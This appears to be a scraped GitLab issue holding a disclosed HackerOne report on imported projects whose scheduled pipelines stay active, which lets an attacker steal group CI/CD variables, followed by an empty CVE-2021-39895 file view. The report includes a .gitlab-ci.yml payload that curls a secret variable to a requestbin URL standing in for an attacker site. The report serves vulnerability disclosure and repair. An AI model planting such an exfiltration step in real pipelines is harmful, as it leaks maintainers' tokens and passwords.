=== Content from gitlab.com_7d24d494_20250114_210050.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Pipeline schedules on imported projects can be set to automatically active after import

**[HackerOne report #1272535](https://hackerone.com/reports/1272535)** by `justas_b` on 2021-07-21, assigned to [@rshambhuni](/rshambhuni "Rohit Shambhuni"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

An attacker can share a custom made project with someone who manages a group (either a maintainer or owner). If that person imports the crafted project to their group, the imported project will, after some time, run an active scheduled pipeline on behalf of the importer (group owner or maintainer). If the run succeeds (the scheduled pipeline is not deleted/disabled in time), an attacker can steal group ci/cd variables via a curl request.

These group ci/cd variables can be personal access tokens of maintainers/owners (that can also allow an attacker to access other projects of maintainer/owner), passwords, other secrets.

##### Steps to reproduce

1. Download [![2021-07-21_17-27-555_342gfdg_test321_export.tar.gz](data:image/gif;base64...)](https://user-content.gitlab-static.net/10ac8ab22ccf8366ab41356d7db7450e014656de/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31333032346136352d393738322d343065662d396531342d6539333434366261663961352f323032312d30372d32315f31372d32372d3535355f333432676664675f746573743332315f6578706f72742e7461722e677a) custom made/exported project
2. Create a group
3. Go to group settings and add a custom ci/cd variable named "TEST\_VAR"

[![bandicam_2021-07-21_22-19-08-445.jpg](data:image/gif;base64...)](https://user-content.gitlab-static.net/a5b93799babc5ccce4772e9e46936c6fccbb570c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32396261306636342d636666362d346162312d613030382d3430656232386461656136372f62616e646963616d5f323032312d30372d32315f32322d31392d30382d3434352e6a7067)

4. Import the previously downloaded custom project to the group
5. After the project has been imported, go to the scheduled pipelines page **CI/CD** -> **Schedules**
6. You should see that the pipeline is automatically active after import and is set to run after x minutes (I think it's possible to make it run after less than 30 minutes)
7. It is possible to speed up the pipeline run by just clicking the "Play" button (it will run either way)
8. The pipeline run should send a curl request containing secret ci/cd variables to requestbin (or an attacker controlled website)

Video poc: [![bandicam_2021-07-21_21-32-20-832.avi](data:image/gif;base64...)](https://user-content.gitlab-static.net/8aa31b2aa7973e989ff7800e176dbfda594a1125/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f66653038303064382d666161612d343436632d396166662d6236636232376533303233622f62616e646963616d5f323032312d30372d32315f32312d33322d32302d3833322e617669)

The hardest part of this attack is user interaction. An attacker can collect ci/cd variable names from .gitlab-ci.yml files (if the projects in that group are public or if the attacker has at least reporter access to the private group)

To create your own custom made project:

1. Create a public project
2. Add a .gitlab-ci.yml to the main protected branch with the following code:

```
build:
  script:
    - curl "https://requestbin.net/r/8acffaos?var=$TEST_VAR"
    - echo $TEST_VAR
```

3. Add a scheduled pipeline to the main protected branch with a custom interval pattern `*/5 * * * *`
4. Export the project

I have managed to get an automatic pipeline to run just after 5 minutes of importing on my other tries. Other times it runs after 30 minutes even though it's set to run every 5 minutes.

Maybe there are better attack scenarios using this vulnerability, but this is the best one I've found so far.

##### What is the current *bug* behavior?

The scheduled pipelines are automatically set to "Active" after import

##### What is the expected *correct* behavior?

The scheduled pipelines should always be set to inactive after import and it should be impossible to set them to "active" in the exported project file (pipeline\_schedules.ndjson)

##### Output of checks

This bug happens on GitLab.com

#### Impact

An attacker can steal group ci/cd variables by creating a custom project and sharing it with group maintainers/owners.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [2021-07-21\_17-27-555\_342gfdg\_test321\_export.tar.gz](https://h1.sec.gitlab.net/a/13024a65-9782-40ef-9e14-e93446baf9a5/2021-07-21_17-27-555_342gfdg_test321_export.tar.gz)
* [bandicam\_2021-07-21\_21-32-20-832.avi](https://h1.sec.gitlab.net/a/fe0800d8-faaa-446c-9aff-b6cb27e3023b/bandicam_2021-07-21_21-32-20-832.avi)
* [bandicam\_2021-07-21\_22-19-08-445.jpg](https://h1.sec.gitlab.net/a/29ba0f64-cff6-4ab1-a008-40eb28daea67/bandicam_2021-07-21_22-19-08-445.jpg)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

## Implementation plan

* update `GitLab::ImportExport::Project::RelationFactory` to add a case for `Ci::PipelineSchedule` under [setup\_models](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/import_export/project/relation_factory.rb#L80)
* update tests accordingly
* update excluded attributes

Edited Oct 18, 2021 by [Igor Frenkel](/ifrenkel)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_5a5fdb73_20250114_210049.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-39895.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-39895.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-39895.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-39895.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Nov 04, 2021

  [9a468b47](/gitlab-org/cves/-/commit/9a468b47ce5073bebedcd7597ed1aafdd4894666)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/9a468b47ce5073bebedcd7597ed1aafdd4894666)
  ·
  9a468b47

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Nov 04, 2021

  9a468b47

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/9a468b47ce5073bebedcd7597ed1aafdd4894666)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Nov 04, 2021

Loading


